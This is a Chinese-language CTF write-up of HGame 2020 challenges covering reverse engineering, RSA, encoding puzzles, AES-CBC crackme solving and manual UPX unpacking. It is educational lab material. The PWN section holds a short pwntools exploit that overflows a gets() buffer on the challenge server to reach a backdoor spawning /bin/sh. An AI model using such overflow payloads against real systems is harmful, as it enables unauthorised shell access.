class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 len; // rax  int len0; // edi  unsigned __int64 v5; // rax  _BYTE *v6; // rbx  const char *v7; // rcx  char flag; // [rsp+20h] [rbp-118h]  puts(&quot;please input you flag:\n&quot;);  memset(&amp;flag, 0, 0x100ui64);  scanf(&quot;%s&quot;, &amp;flag, 100i64);  len = strlen(&amp;flag);                          // 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）  len0 = len;  if ( !len )                                   // 若输入空字符串，直接报错  &#123;LABEL_6:    v7 = &quot;try again\n&quot;;    goto LABEL_7;  &#125;  v5 = sub_140002000(len);                        v6 = malloc(v5);                                // 分配空间  cryption(v6, (__int64)&amp;flag, len0);           // 加密算法部分  if ( strncmp(v6, &quot;0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX&quot;, 0x64ui64) )// 相同则返回0，跳过if，输出get it，flag正确  &#123;    if ( v6 )      free(v6);    goto LABEL_6;  &#125;  v7 = &quot;get it\n&quot;;LABEL_7:  puts(v7);  return 0;&#125;//最重要的cryption加密函数signed __int64 __fastcall sub_140001EB0(_BYTE *a1, __int64 a2, int a3)&#123;  int v3; // er10  __int64 v4; // rax  __int64 v5; // rbx  _BYTE *v6; // rdi  _BYTE *v7; // r9  signed __int64 v8; // r11  unsigned __int64 v9; // rdx  unsigned __int64 v10; // rax  char v11; // cl  // a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度  v3 = 0;  v4 = a3 - 2;  v5 = a2;  v6 = a1;  v7 = a1;  if ( v4 &gt; 0 )  &#123;    v8 = a2 + 1;    v9 = ((unsigned __int64)((unsigned __int64)(v4 - 1) * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 &gt;&gt; 64) &gt;&gt; 1) + 1;    v3 = 3 * v9;    do    &#123;      v10 = *(unsigned __int8 *)(v8 - 1);      v8 += 3i64;      *v7 = alphabet[v10 &gt;&gt; 2];      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v8 - 3) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v8 - 4) &amp; 3)];      v7[2] = alphabet[4i64 * (*(_BYTE *)(v8 - 3) &amp; 0xF) | ((unsigned __int64)*(unsigned __int8 *)(v8 - 2) &gt;&gt; 6)];      v7[3] = alphabet[*(_BYTE *)(v8 - 2) &amp; 0x3F];      v7 += 4;      --v9;    &#125;    while ( v9 );  &#125;  if ( v3 &lt; a3 )  &#123;    *v7 = alphabet[(unsigned __int64)*(unsigned __int8 *)(v3 + v5) &gt;&gt; 2];    if ( v3 == a3 - 1 )    &#123;      v11 = 61;      v7[1] = alphabet[16 * (*(_BYTE *)(v3 + v5) &amp; 3)];    &#125;    else    &#123;      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v5 + v3 + 1) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v3 + v5) &amp; 3)];      v11 = alphabet[4 * (*(_BYTE *)(v5 + v3 + 1) &amp; 0xF)];    &#125;    v7[2] = v11;    v7[3] = 61;    v7 += 4;  &#125;  *v7 = 0;  return v7 - v6 + 1;&#125;</code></pre><p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p><pre><code class="python">alphabet=&#39;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</code></pre><p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p><pre><code class="python">#-*- coding:utf-8 -*-def b64de(path_in, path_out):    b64_str = open(path_in).read()    charset = &quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    # print(charset)    bin_str = []    for i in b64_str:        if i != &#39;=&#39;:            try:                x = str(bin(charset.index(i))).replace(&#39;0b&#39;, &#39;&#39;)            except ValueError:                print(i)            bin_str.append(&#39;&#123;:0&gt;6&#125;&#39;.format(x))  # 填充成6位            # print(bin_str)    b64_bin = bytearray()  # 最后只能写入bytes    nums = len(bin_str) // 4    remain = len(bin_str) % 4    fore_part = bin_str[:4 * nums]  # 四个一组截取    # print(fore_part)    while fore_part:        # 取4个6位base64字符，作为3个字节        b64_tmp = &#39;&#39;.join(fore_part[:4])  # 4*6/8        b64_tmp = [int(b64_tmp[x: x + 8], 2) for x in [0, 8, 16]]  # 转换成10进制        # print(b64_tmp)        for i in b64_tmp:            b64_bin.append(i)        fore_part = fore_part[4:]  # 向后移动四位    if remain:        remain_part = &#39;&#39;.join(bin_str[nums * 4:])        # print(remain_part)        tmp = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]        # print(tmp)        for i in tmp:            b64_bin.append(i)    # print(b64_bin)    fd = open(path_out, &#39;wb&#39;)    fd.write(b64_bin)    fd.close()    if __name__ == &#39;__main__&#39;:    b64de(&quot;./pic_en.txt&quot;, &quot;./pic_de.txt&quot;)    </code></pre><p>输出的flag为：</p><pre><code class="flag">hgame&#123;b45e6a_i5_50_eazy_6VVSQ&#125;</code></pre><h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p><pre><code class="c++"> sub_140002AE0((__int64)&amp;v13);                 // 大概是string类的构造函数  sub_1400018D0(std::cin, &amp;v13);                // cin&gt;&gt;v13  v15 = &quot;hgame&#123;&quot;;  sub_140002B30((__int64)&amp;v14);  if ( find_sub(&amp;v13, v15, 0i64) || find_sub(&amp;v13, &quot;&#125;&quot;, 0i64) != 61 )// 猜测输入字符串长度位62，格式位hgame&#123;***&#125;  &#123;    v5 = sub_140001900(std::cout, &quot;error&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140002830);    sub_140003010(&amp;v14);    sub_140002FA0(&amp;v13);    result = 0i64;  &#125;  else  &#123;    for ( i = 6i64; ; i = v11 + 1 )             // 一波操作完全看不懂，猜测是根据&#39;_&#39;来分割字符串，分割成9个数    &#123;      LOBYTE(v0) = &#39;_&#39;;      v11 = find(&amp;v13, v0, i);      if ( v11 == -1 )        break;      v16 = sub_1400043B0(&amp;v13, &amp;v40, i, v11 - i);      v17 = v16;      v1 = sub_140003E80(v16);      v18 = atoll(v1);      sub_140004350(&amp;v14, &amp;v18);      sub_140002FA0(&amp;v40);    &#125;    v19 = sub_1400043B0(&amp;v13, &amp;v41, i, 61 - i);    v20 = v19;    v2 = sub_140003E80(v19);    v21 = atoll(v2);                            // 直接把字符串转换成长整型，说明字符串里就是以&#39;_&#39;连接的数字    sub_140004350(&amp;v14, &amp;v21);    sub_140002FA0(&amp;v41);    v31 = 26727i64;                             // 根据下面的运算这里应该是两个矩阵    v32 = 24941i64;    v33 = 101i64;    v34 = 29285i64;    v35 = 26995i64;    v36 = 29551i64;    v37 = 29551i64;    v38 = 25953i64;    v39 = 29561i64;    v22 = 1i64;    v23 = 0i64;    v24 = 1i64;    v25 = 0i64;    v26 = 1i64;    v27 = 1i64;    v28 = 1i64;    v29 = 2i64;    v30 = 2i64;    for ( j = 0i64; j &lt; 3; ++j )                // 三个for循环时矩阵运算，如果满足条件就直接输出正确    &#123;      for ( k = 0i64; k &lt; 3; ++k )      &#123;        v12 = 0i64;        for ( l = 0; l &lt; 3; ++l )          v12 += *(&amp;v22 + 3 * l + k) * *(_QWORD *)sub_1400031E0(&amp;v14, l + 3 * j);        if ( *(&amp;v31 + 3 * j + k) != v12 )        &#123;          v3 = sub_140001900(std::cout, &quot;error&quot;);          std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, sub_140002830);          sub_140003010(&amp;v14);          sub_140002FA0(&amp;v13);          return 0i64;        &#125;      &#125;    &#125;    v6 = sub_140001900(std::cout, &quot;you are good at re&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v6, sub_140002830);</code></pre><p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p><p>尝试一下</p><pre><code class="python">import numpy as npa = np.array([[1, 0, 1], [0, 1, 1], [1, 2, 2]])b = np.linalg.inv(a)# print(b)# print(np.dot(a,b))c = np.array([[26727, 24941, 101], [29285, 26995, 29551], [29551, 25953, 29561]])flag = &#39;&#39;d = np.dot(c, b)for i in range(3):    for j in range(3):        flag += str(int(d.item(i, j))) + &#39;_&#39;flag = &#39;hgame&#123;&#39; + flag[:-1] + &#39;&#125;&#39;print(flag)</code></pre><p>提交提示成功，猜测正确</p><pre><code class="flag">hgame&#123;-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943&#125;</code></pre><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s; // [esp+0h] [ebp-ACh]  char v5; // [esp+7Bh] [ebp-31h]  unsigned int v6; // [esp+A0h] [ebp-Ch]  int *v7; // [esp+A4h] [ebp-8h]  v7 = &amp;argc;  v6 = __readgsdword(0x14u);  alarm(8u);  setbuf(_bss_start, 0);  memset(&amp;s, 0, 0xA0u);  puts(&quot;Let&#39;s 0O0o\\0O0!&quot;);  gets(&amp;s);  if ( !memcmp(&quot;0O0o&quot;, &amp;v5, 7u) )    backdoor();  return 0;&#125;//backdoorint backdoor()&#123;  return system(&quot;/bin/sh&quot;);&#125;</code></pre><p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p><pre><code class="python">from pwn import *io = remote(&quot;47.103.214.163&quot;,&quot;20000&quot;)#io=process(&quot;./Hard_AAAAA&quot;)io.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)payload=&#39;a&#39;*123+&#39;0O0o\0O0&#39;io.sendline(payload)io.interactive()</code></pre><p>最终得到flag：</p><pre><code class="flag">hgame&#123;0OoO0oo0O0Oo&#125;</code></pre><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p><pre><code class="python">#-*- coding:utf-8 -*-def gcdext(a, b):    &quot;&quot;&quot;    a: 模的取值    b: 想求逆的值    &quot;&quot;&quot;    if b == 0:        return 1, 0, a    x, y, gcd = gcdext(b, a % b)    return y, x - a // b * y, gcdc = 275698465082361070145173688411496311542172902608559859019841p = 681782737450022065655472455411q = 675274897132088253519831953441e = 13n = p * q# print(k)fai = (p - 1) * (q - 1)(d, k, g) = gcdext(e, fai)# print(fai)# print(k)# print(m)m = pow(c, d, n)# print(m)f = m.to_bytes(22, byteorder=&#39;big&#39;)print(f)</code></pre><p>直接求解出来flag</p><pre><code class="flag">hgame&#123;t3Xt6O0k_R5A!!!&#125;</code></pre><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p><pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>像是摩斯电码base64加密之后的东西</p><p>所以base64解码之后</p><pre><code class="morse">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></pre><p>果然是摩斯电码，然后解摩斯电码</p><pre><code class="python">#-*- coding:utf-8 -*-CODE = &#123;&#39;A&#39;: &#39;.-&#39;, &#39;B&#39;: &#39;-...&#39;, &#39;C&#39;: &#39;-.-.&#39;,        &#39;D&#39;: &#39;-..&#39;, &#39;E&#39;: &#39;.&#39;, &#39;F&#39;: &#39;..-.&#39;,        &#39;G&#39;: &#39;--.&#39;, &#39;H&#39;: &#39;....&#39;, &#39;I&#39;: &#39;..&#39;,        &#39;J&#39;: &#39;.---&#39;, &#39;K&#39;: &#39;-.-&#39;, &#39;L&#39;: &#39;.-..&#39;,        &#39;M&#39;: &#39;--&#39;, &#39;N&#39;: &#39;-.&#39;, &#39;O&#39;: &#39;---&#39;,        &#39;P&#39;: &#39;.--.&#39;, &#39;Q&#39;: &#39;--.-&#39;, &#39;R&#39;: &#39;.-.&#39;,        &#39;S&#39;: &#39;...&#39;, &#39;T&#39;: &#39;-&#39;, &#39;U&#39;: &#39;..-&#39;,        &#39;V&#39;: &#39;...-&#39;, &#39;W&#39;: &#39;.--&#39;, &#39;X&#39;: &#39;-..-&#39;,        &#39;Y&#39;: &#39;-.--&#39;, &#39;Z&#39;: &#39;--..&#39;,        &#39;0&#39;: &#39;-----&#39;, &#39;1&#39;: &#39;.----&#39;, &#39;2&#39;: &#39;..---&#39;,        &#39;3&#39;: &#39;...--&#39;, &#39;4&#39;: &#39;....-&#39;, &#39;5&#39;: &#39;.....&#39;,        &#39;6&#39;: &#39;-....&#39;, &#39;7&#39;: &#39;--...&#39;, &#39;8&#39;: &#39;---..&#39;,        &#39;9&#39;: &#39;----.&#39;,        &#39;.&#39;: &#39;.-.-.-&#39;, &#39;:&#39;: &#39;---...&#39;, &#39;,&#39;: &#39;--..--&#39;, &#39;;&#39;: &#39;-.-.-.&#39;,        &#39;?&#39;: &#39;..--..&#39;, &#39;=&#39;: &#39;-...-&#39;, &#39;\&#39;&#39;: &#39;.----.&#39;, &#39;/&#39;: &#39;-..-.&#39;,        &#39;!&#39;: &#39;-.-.--&#39;, &#39;-&#39;: &#39;-....-&#39;, &#39;_&#39;: &#39;..--.-&#39;, &#39;&quot;&#39;: &#39;.-..-.&#39;,        &#39;(&#39;: &#39;-.--.&#39;, &#39;)&#39;: &#39;-.--.-&#39;, &#39;$&#39;: &#39;...-..-&#39;, &#39;&amp;&#39;: &#39;.-...&#39;,        &#39;@&#39;: &#39;.--.-.&#39;        &#125;def Decode(str):    Decode_value = CODE.keys()    Decode_key = CODE.values()    Decode_dict = dict(zip(Decode_key, Decode_value))    text = &#39;&#39;    msg = str.split(&#39; &#39;)    for s in msg:        if s in Decode_dict.keys():            text += Decode_dict[s]    return textprint(Decode(&#39;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#39;))</code></pre><p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p><pre><code class="flag">hgame&#123;W3LC0ME_TO_2020_HGAM3&#125;</code></pre><h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p><p>解压出来打开flag.txt，内容如下：</p><pre><code>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>unicode编码，解码得：</p><pre><code class="flag">hgame&#123;Do_y0u_KnOW_uNiC0d3?&#125;</code></pre><h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p><pre><code>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fences first, Five Caesar next. English sentense first,  zip password next.</code></pre><p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p><pre><code>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.EAVMUBAQHQMVEPDT</code></pre><p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p><pre><code class="flag">hgame&#123;3Nc0dInG_@lL_iN_0Ne!&#125;</code></pre><p>这题有各种各样的编码，还不错</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a href="https://www.52pojie.cn/thread-1048649-1-1.html">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p><pre><code class="c++">#include &lt;idc.idc&gt;#define PT_LOAD              1#define PT_DYNAMIC           2static main(void)&#123;  auto ImageBase,StartImg,EndImg;  auto e_phoff;  auto e_phnum,p_offset;  auto i,dumpfile;  ImageBase=0x400000;  StartImg=0x400000;  EndImg=0x0;  if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )  &#123;    if(dumpfile=fopen(&quot;D:\\dumpfile&quot;,&quot;wb&quot;))    &#123;      e_phoff=ImageBase+Qword(ImageBase+0x20);      Message(&quot;e_phoff = 0x%x\n&quot;, e_phoff);      e_phnum=Word(ImageBase+0x38);      Message(&quot;e_phnum = 0x%x\n&quot;, e_phnum);      for(i=0;i&lt;e_phnum;i++)      &#123;         if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)         &#123;             p_offset=Qword(e_phoff+0x8);            StartImg=Qword(e_phoff+0x10);            EndImg=StartImg+Qword(e_phoff+0x28);            Message(&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;, StartImg, EndImg, p_offset);            dump(dumpfile,StartImg,EndImg,p_offset);            Message(&quot;dump segment %d ok.\n&quot;,i);         &#125;             e_phoff=e_phoff+0x38;      &#125;      fseek(dumpfile,0x3c,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fseek(dumpfile,0x28,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);            fclose(dumpfile);    &#125;else Message(&quot;dump err.&quot;);  &#125;&#125;static dump(dumpfile,startimg,endimg,offset) &#123;  auto i;  auto size;  size=endimg-startimg;  fseek(dumpfile,offset,0);  for ( i=0; i &lt; size; i=i+1 )   &#123;    fputc(Byte(startimg+i),dumpfile);  &#125;&#125;</code></pre><p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p><pre><code class="c++">scanf((__int64)&quot;%42s&quot;, v7);  v5 = 0;  for ( i = 0; i &lt;= 41; ++i )  &#123;    if ( i + v7[i] != (unsigned __int8)byte_6CA0A0[i] )      v5 = 1;  &#125;  if ( v5 == 1 )  &#123;    v0 = &quot;Wrong input&quot;;    printf(&quot;Wrong input&quot;, v7);  &#125;  else  &#123;    v0 = &quot;Congratulations! Flag is your input&quot;;    printf(&quot;Congratulations! Flag is your input&quot;, v7);  &#125;</code></pre><p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123;    unsigned char ida_chars[] =            &#123;                    0x68, 0x68, 0x63, 0x70, 0x69, 0x80, 0x5B, 0x75, 0x78, 0x49,                    0x6D, 0x76, 0x75, 0x7B, 0x75, 0x6E, 0x41, 0x84, 0x71, 0x65,                    0x44, 0x82, 0x4A, 0x85, 0x8C, 0x82, 0x7D, 0x7A, 0x82, 0x4D,                    0x90, 0x7E, 0x92, 0x54, 0x98, 0x88, 0x96, 0x98, 0x57, 0x95,                    0x8F, 0xA6            &#125;;    string flag;    for(int i=0;i&lt;42;i++)        &#123;            flag+=ida_chars[i]-i;        &#125;    cout&lt;&lt;flag&lt;&lt;endl;    return 0;&#125;</code></pre><p>最后输出flag</p><pre><code>hgame&#123;Unp@cking_1s_R0m4ntic_f0r_r3vers1ng&#125;</code></pre><h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p><p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p><pre><code class="c#">private void button1_Click(object sender, EventArgs e)        &#123;            if (this.status == 1)            &#123;                MessageBox.Show(&quot;你已经激活成功啦，快去提交flag吧~~~&quot;);                return;            &#125;            string text = this.textBox1.Text;            if (text.Length != 46 || text.IndexOf(&quot;hgame&#123;&quot;) != 0 || text.IndexOf(&quot;&#125;&quot;) != 45)            &#123;                MessageBox.Show(&quot;Illegal format&quot;);                return;            &#125;            string base64iv = text.Substring(6, 24);            string str = text.Substring(30, 15);            try            &#123;                Aes aes = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, base64iv);                Aes aes2 = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, &quot;MFB1T2g5SWxYMDU0SWN0cw==&quot;);                string text2 = aes.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;);                if (text2.Equals(&quot;Same_ciphertext_&quot;))                &#123;                    byte[] array = new byte[16];                    Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);                    if (Convert.ToBase64String(array).Equals(&quot;dJntSWSPWbWocAq4yjBP5Q==&quot;))                    &#123;                        MessageBox.Show(&quot;注册成功！&quot;);                        this.Text = &quot;已激活，欢迎使用！&quot;;                        this.status = 1;                    &#125;                    else                    &#123;                        MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));                    &#125;                &#125;                else                &#123;                    MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));                &#125;            &#125;            catch            &#123;                MessageBox.Show(&quot;注册失败！&quot;);            &#125;        &#125;</code></pre><p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p><p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p><p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p><p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p><p>直接python解决：</p><pre><code class="python">from Crypto.Cipher import AESimport base64# 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文class AesCrypter(object):    def __init__(self, key, iv):        self.key = key        self.iv = iv    def pkcs7padding(self, text):        bs = AES.block_size  # 16        length = len(text)        bytes_length = len(bytes(text, encoding=&#39;utf-8&#39;))        padding_size = length if (bytes_length == length) else bytes_length        padding = bs - padding_size % bs        padding_text = chr(padding) * padding        return text + padding_text    def pkcs7unpadding(self, text):        length = len(text)        unpadding = ord(text[length - 1])        return text[0:length - unpadding]    def encrypt(self, content):        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)        content_padding = self.pkcs7padding(content)        aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding=&#39;utf-8&#39;))        result = base64.b64encode(aes_encode_bytes).decode(encoding=&#39;utf-8&#39;)        return result    def decrypt(self, content):        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)        # base64解码        aes_encode_bytes = base64.b64decode(content)        # 解密        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)        # 重新编码        result = aes_decode_bytes.decode(encoding=&#39;utf-8&#39;)        # 去除填充内容        result = self.pkcs7unpadding(result)        if result == None:            return &quot;&quot;        else:            return resultkey = base64.b64decode(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;)fakeIV = base64.b64decode(&#39;MFB1T2g5SWxYMDU0SWN0cw==&#39;)plainText = &quot;Same_ciphertext_&quot;ciperText = &quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;aesCipher = AesCrypter(key, fakeIV)fakePlainText = aesCipher.decrypt(ciperText)# print(fakePlainText)IV = &#39;&#39;for i in range(16):    IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))# print(&quot;IV : &quot; + IV)# /TyXYzPnY;$)\we_IV = base64.b64encode(IV.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)cipherText2 = aesCipher.encrypt(plainText)cipherText2 = base64.b64decode(cipherText2).hex()[:32]cipherText3 = &#39;dJntSWSPWbWocAq4yjBP5Q==&#39;cipherText3 = base64.b64decode(cipherText3).hex()[:32]# print(cipherText2 + cipherText3)cipherText4 = bytes.fromhex(cipherText2 + cipherText3)cipherText4 = base64.b64encode(cipherText4)# print(cipherText4)plainText3 = aesCipher.decrypt(cipherText4)# print(plainText3)# Same_ciphertext_DiFfer3Nt_w0r1dflag = &#39;&#39;flag += &#39;hgame&#123;&#39; + IV + plainText3[16:] + &#39;&#125;&#39;print(flag)# hgame&#123;L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d&#125;</code></pre><p>最终的flag</p><pre><code>hgame&#123;L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d&#125;</code></pre><h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p><p>dis指令表见<a href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p><p>还原出来的函数原型（想打死命名的人）</p><pre><code class="python">def encrypt(OOo): O0O = OOo[::-1] O0o = list(O0O) for O0 in range(1, len(O0o)):     Oo = O0o[O0-1] ^ O0o[O0]     O0o[O0] = Oo O = bytes(O0o) return O.hex()</code></pre><p>所以只需要反过来异或一遍就可以了</p><pre><code class="python">s = bytes.fromhex(&#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;)c = list(str)for i in range(len(c) - 1, 0, -1):    c[i] ^= c[i - 1]print(bytes(c[::-1]))</code></pre><p>输出flag</p><pre><code>hgame&#123;sT4cK_1$_sO_e@Sy~~&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> re </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-re部分题解</title>
      <link href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
